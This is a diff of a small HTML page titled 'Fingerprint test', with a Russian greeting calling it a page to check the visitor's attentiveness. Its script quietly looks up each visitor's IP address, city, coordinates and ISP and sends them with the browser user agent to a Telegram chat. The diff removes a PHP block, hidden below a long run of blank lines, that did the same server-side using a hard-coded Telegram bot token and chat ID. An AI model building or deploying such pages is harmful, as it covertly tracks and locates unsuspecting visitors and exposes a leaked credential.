@@ -1,11 +1,10 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
   <meta charset="utf-8">  
   <title>Fingerprint test</title>
 </head>
 <body>
-
 
 <script>
 // Detect the client's IP address
@@ -22,13 +21,14 @@ fetch('https://ipwhois.io/json/')
   })
   .then(api => {
     // Декларация переменных
-    const ip = api.ip;
+    ip = api.ip;
     const country = api.country;
     const region = api.region;
     const city = api.city;
     const latitude = api.latitude;
     const longitude = api.longitude;
     const isp = api.isp;
+
     // Prepare the message to send to Telegram
     const message = encodeURIComponent(`${ip}\n${country} ${region}\n${city}\n${latitude}\n${longitude}\n${isp}\n\n${ua}`);
 
@@ -50,61 +50,16 @@ fetch('https://ipwhois.io/json/')
   .catch(error => {
     console.error('Error fetching IP details:', error);
   });
-
-
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-<?php
-if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP']; }
-$ip = $_SERVER['REMOTE_ADDR'];
-$ua =  $_SERVER['HTTP_USER_AGENT'];
-
-$api = json_decode(file_get_contents('http://free.ipwhois.io/json/'.$ip), true);
-$country = $api['country'];
-$region = $api['region'];
-$city = $api['city'];
-
-$latitude = $api['latitude'];
-$longitude = $api['longitude'];
-$isp = $api['isp'];
-
-
-$client = '669186959';
-
-file_get_contents('https://api.telegram.org/bot1682820271:AAE3HGqITz6N5qyIcy3ODm6rOIypbBseAJ4/sendMessage?chat_id=669186959&parse_mode=html&text='.urlencode($ip."\n".$county.$region."\n".$city."\n".$latitude."\n".$longitude."\n".$isp."\n\n".$ua));
-?>
 
 <img src="unnamed.jpg" title="Image" alt="alt text">
 
+<p>
+  Всем привет, вы <br>
+  попали на волшебную страницу. Она создана <br>
+  для проверки <br>
+  вашей внимательности.
+</p>
 
-
-  <p>
-    Всем привет, вы <br>
-    попали на волшебную страницу. Она создана <br>
-    для проверки <br>
-    вашей внимательности.
-  </p>
-   
 </body>
 </html>
